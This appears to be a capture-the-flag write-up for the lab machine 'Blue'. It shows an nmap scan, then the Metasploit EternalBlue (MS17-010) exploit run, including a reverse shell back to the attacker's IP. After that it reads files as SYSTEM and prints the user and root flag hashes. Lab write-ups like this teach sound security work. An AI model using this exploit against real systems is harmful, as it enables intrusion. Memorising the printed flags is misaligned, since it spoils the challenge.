# MACHINE CHALLENGE: BLUE

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.40
OS: Windows
```

### NAME OF THE MACHINE AS A HINT?

Since this is a `Windows` box, perhaps this is in reference to the recent
`ETERNALBLUE` exploit?

```
https://en.wikipedia.org/wiki/EternalBlue

EternalBlue, sometimes stylized as ETERNALBLUE, is an exploit developed by the
U.S. National Security Agency (NSA) according to testimony by former NSA
employees. It was leaked by the Shadow Brokers hacker group on April 14, 2017,
and was used as part of the worldwide WannaCry ransomware attack on May 12,
2017. The exploit was also used to help carry out the 2017 NotPetya cyberattack
on June 27, 2017 and reported to be used as part of the Retefe banking trojan
since at least September 5, 2017.

EternalBlue exploits a vulnerability in Microsoft's implementation of the Server
Message Block (SMB) protocol. This vulnerability is denoted by entry
CVE-2017-0144 in the Common Vulnerabilities and Exposures (CVE) catalog. The
vulnerability exists because the SMB version 1 (SMBv1) server in various
versions of Microsoft Windows mishandles specially crafted packets from remote
attackers, allowing them to execute arbitrary code on the target computer.
```

### PORTSCANNING w/ NMAP

Use `nmap` to see if we can detect what services our host is offering, what
operating system (and version) our host is running, what type of packet
filters/firewalls are in use, etc.

```
$ sudo nmap -A -sS -T4 10.10.10.40 > nmap.out
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-21 17:44 EST
Nmap scan report for 10.10.10.40
Host is up (0.39s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

So we have 3 open service running - msrpc(135,49152-49157), netbios-ssn(139),
microsoft-ds(445). Host OS is Windows 7 Profession 7601 Service Pack 1. 

```
https://en.wikipedia.org/wiki/Server_Message_Block

Since Windows 2000, SMB runs, by default, with a thin layer, similar to the
Session Message packet of NBT's Session Service, on top of TCP, using TCP port
445 rather than TCP port 139—a feature known as "direct host SMB".
```

So the microsoft-ds(445) service suddenly pops out as being interesting with
its tie in to the ETERNALBLUE exploit.

### MS17_010_ETERNALBLUE

Googling around for a metasploit package to exploit the ETERNALBLUE
vulnerability leads us to this one..

```
https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue

MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

This module is a port of the Equation Group ETERNALBLUE exploit, part of the
FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow
memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in
Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted
into a WORD. The kernel pool is groomed so that overflow is well laid-out to
overwrite an SMBv1 buffer. Actual RIP hijack is later completed in
srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not
trigger 100% of the time, and should be run continuously until triggered. It
seems like the pool will get hot streaks and need a cool down period before the
shells rain in again. The module will attempt to use Anonymous login, by
default, to authenticate to perform the exploit. If the user supplies
credentials in the SMBUser, SMBPass, and SMBDomain options it will use those
instead. On some systems, this module may cause system instability and crashes,
such as a BSOD or a reboot. This may be more likely with some payloads.
```

So let's give it a try!

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf exploit(ms17_010_eternalblue) > set TARGET 0
TARGET => 0
msf exploit(ms17_010_eternalblue) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf exploit(ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.16.124:4444 
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.16.124:4444 -> 10.10.10.40:49158) at 2017-12-22 15:40:58 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Holy crap.. we have a session!

### OWN USER

```
C:\Windows\system32> cd C:\Users
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of c:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  14,170,099,712 bytes free

C:\Users\haris\Desktop>cd haris\Desktop
C:\Users\haris\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

21/07/2017  06:54    <DIR>          .
21/07/2017  06:54    <DIR>          ..
21/07/2017  06:54                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  14,170,099,712 bytes free
C:\Users\haris\Desktop>type user.txt.txt
type user.txt.txt
4c546aea7dbee75cbd71de245c8deea9
```

### OWN MACHINE

```
C:\Users\haris\Desktop>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:57                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  14,169,812,992 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
ff548eb71e920ff6c08843ce9df4e717
```
